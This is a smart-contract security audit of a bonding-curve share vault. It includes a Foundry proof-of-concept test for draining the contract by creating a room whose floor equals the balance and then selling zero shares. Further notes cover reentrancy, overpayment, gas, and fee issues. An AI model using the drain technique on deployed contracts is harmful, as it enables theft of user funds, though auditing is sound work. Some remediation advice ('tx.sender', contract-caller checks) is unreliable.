# Audit

## [CRITICAL-01] it is possible to sell nothing for everything

The `sellShares` function does not check if `amount` is greater than zero, leading to attacker being able to steal the entire balance of the contract.

The formula for the quadratic curve is:

```solidity
return summation * 1 ether / steepness + floor;
```

where summation is the quadratic supply delta and `floor` is initialized by creator of the room.
when selling `amount = 0` then `summation = 0`, leading to return `floor` from `getPriceLinear` and `getPriceQuadratic`.
since `floor` is controlled by the room creator, an attacker can create a room with `floor = address(simps).balance` and sell 0 shares, resulting in sell price of the entire balance.

PoC:

```solidity
/// @dev Test selling zero amount of shares does not transfer any funds since quadratic curve results in floor price
function test_SellZeroQuadratic() public {
    vm.startPrank(simp1);

    // ensure contract has funds
    vm.deal(address(simps), 100 ether);

    // steal `floor` amount of funds
    uint256 floor = address(simps).balance;
    uint256 room = simps.createRoom(SimpsVault.Curves.Quadratic, 16000, floor, 0, 0);

    uint256 balanceBefore = address(simp1).balance;
    simps.sellShares(simp1, 0, 0);
    uint256 balanceAfter = address(simp1).balance;
    assertEq(balanceAfter - balanceBefore, 0);

    vm.stopPrank();
}
```

### Remediation

`require(amount > 0)` in `sellShares` and/or in `getPriceLinear`, `getPriceQuadratic`.

perhaps consider removing floor price altogether.

### SimpsToken.sol does not exist

this file is referenced in `test/Token.t.sol` but does not exist in git.

### createRoom can be optimized

also Room struct does not require midPoint, maxPrice for all curves, as well as floor and even steepness

# buyShares do not refund excess ether transferred

if someone overpays they are not refunded.
it is recommended to refund remainder or limit slippage

## there is reentrancy in buyShares & sellShares

`(bool success2, ) = sharesSubject.call{value: subjectFee}("");`
since sharesSubject is user controlled address

### Remediation

in `createRoom` check:
`require(msg.sender == tx.sender)`
or
`require(!isContract(msg.sender))`


### Sigmoid has for-loop on user input amount

the for body contains sqrt (which also has a loop)
making it increasingly difficult and expensive to buy shares as amount grows


### no limit on setting fees, can accidentaly set bad values

also it is recommended to check if fees resulted in 0 before making transfer calls


### when isBuy = true in getPrice and sharesSupply is 0...


### getPriceOriginal is subset of getPriceQuadratic

this function can be removed as it is simply quadratic curve with `steepness = 16000` and `floor = 0`


notes:
need to be careful as params have different meanings for different curves
eg. steepness divided by 500 in liner settings a lower bound of 500 otherwise get division by 0


an economic attack on a single curve will likely affect entire funds in the contract
perhaps splitting the curves to different contracts or tracking each balance could limit such scenarios


sell shares amount can be 0?


if I can make sigmoid to return cheap price when buying share(s) at supply = 1 but high price when selling at supply > 1 it is potential win
